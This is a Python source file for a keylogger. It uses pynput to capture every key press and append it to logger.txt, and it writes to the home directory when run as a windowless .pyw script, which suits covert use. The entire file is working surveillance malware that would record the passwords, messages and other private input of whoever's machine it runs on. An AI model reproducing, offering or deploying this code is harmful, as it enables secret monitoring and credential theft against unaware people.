# -*- coding: utf-8 -*-
import re
import sys
from pathlib import Path

from pynput.keyboard import Listener
import os

line_length = 0


def key_recorder(key):
    if '.pyw' in sys.argv[0]:
        home = str(Path.home())
    else:
        home = ''
    f = open(os.path.join(home, 'logger.txt'), 'a+')
    keyo = str(key)
    global line_length
    line_length += 1
    if line_length >= 50:
        f.write("\n")
        line_length = 0
    if keyo == "Key.enter":
        f.write('\n')
    elif keyo == "Key.space":
        f.write(" ")
    elif keyo == "Key.backspace":
        f.write(" {" + keyo + "} ")
        #     size = f.tell()  # the size...
        #     f.truncate(size - 1)
    elif len(re.findall(r'Key.([\w\d]+)', keyo)) > 0:
        if len(re.findall(r'Key.([\w\d]+)', keyo)[0]) > 1:
            f.write("")
    elif len(re.findall(r'(x[\d]+)', keyo)) > 0:
        f.write('')
    elif len(re.findall(r'<([\d]+)>', keyo)) > 0 :
        if int(re.findall(r'<([\d]+)>', keyo)[0]) - 96 < 10:
            f.write(str(int(re.findall(r'<([\d]+)>', keyo)[0]) - 96))
        elif re.findall(r'<([\d]+)>', keyo)[0] == '110':
            f.write('.')


    # elif keyo == "Key.alt_l" or keyo == "Key.tab":
    #     f.write('')
    # elif keyo == "Key.ctrl_l":
    #     f.write('')
    # elif keyo == "Key.alt_gr":
    #     f.write('')
    # elif keyo == "Key.up" or keyo == "Key.down":
    #     f.write('')
    # elif keyo == "Key.right" or keyo == "Key.left":
    #     f.write('')
    # elif len(re.findall(r'(x[\d]+)', keyo)) > 0:
    #     f.write('')
    else:
        print(keyo)
        f.write(keyo.replace("'", ""))


with Listener(on_press=key_recorder) as l:
    l.join()
